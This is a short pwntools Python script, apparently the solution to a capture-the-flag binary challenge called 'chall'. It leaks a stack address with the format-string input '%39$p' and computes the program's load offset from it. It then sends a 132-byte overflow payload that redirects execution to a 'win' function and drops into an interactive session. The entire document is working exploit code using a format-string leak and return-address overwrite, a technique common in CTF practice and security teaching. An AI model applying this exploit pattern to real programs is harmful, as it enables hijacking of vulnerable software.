#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
break win
c
'''.format(**locals())

io = start()

io.sendline(b'%39$p')
io.readuntil(b'0x')
x = io.read(8)

offset = int(x, 16) - 21 - exe.sym.main
win_add = exe.sym.win + offset 

info(x)
info(win_add)

payload = flat({
    132: [
        win_add
    ]
})

io.sendline(payload)
io.interactive()
